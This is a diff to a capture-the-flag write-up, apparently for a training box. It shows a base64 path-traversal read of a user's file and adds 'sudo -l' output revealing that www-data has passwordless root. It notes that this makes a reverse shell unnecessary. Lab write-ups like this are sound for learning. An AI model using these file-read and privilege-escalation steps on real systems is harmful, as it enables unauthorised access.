@@ -30,7 +30,15 @@ Second_Ingrediant:
     base64 ../../../home/rick/'second ingredients' | base64 --decode
 "
 Now The third ingr is in the root directory
-But dont worry theres a vuln and we can use sudo without password so we dont even have to connect to 
+But dont worry theres no pass for sudo if you do: sudo -l 
+Output:
+Matching Defaults entries for www-data on ip-10-10-81-23.eu-west-1.compute.internal:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on ip-10-10-81-23.eu-west-1.compute.internal:
+    (ALL) NOPASSWD: ALL
+
+And bcs of that we dont even have to connect to 
 the server via a reverse_shell
 
 Third_And_Final_Ingrediant:
